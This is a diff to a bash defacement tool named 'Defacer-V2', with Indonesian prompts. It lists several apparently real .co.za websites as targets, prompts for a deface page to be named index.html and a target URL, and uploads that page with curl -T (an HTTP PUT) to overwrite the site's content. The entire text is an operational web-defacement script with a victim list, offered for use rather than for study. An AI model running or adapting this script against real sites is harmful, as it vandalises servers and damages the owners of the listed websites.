@@ -73,10 +73,14 @@ echo $white "http://techdirect.co.za"
 echo $cyan "http://thehellenic.co.za"
 echo $white "http://valdicare.co.za"
 echo
-echo $white"  Masukan Target!!!!"
+echo "    Masukan Script Deface!!!"
+echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Kalo Mau Tebas Index Namai SC index.html"$white                               
+read -p " ╰─$ " script
+echo
+echo
+echo $white"  Masukan Target 1 !!!!"
 echo $white "╭─"$green"Chemod@zrd404"$cyan" ~/Defacer-V2"$white
 read -p " ╰─$ " target
-echo
 curl -T /storage/emulated/0/$script $target
 echo $cyan"     ["$green"+"$cyan"]"$red"==="$white"＞"$green"$target"
 echo
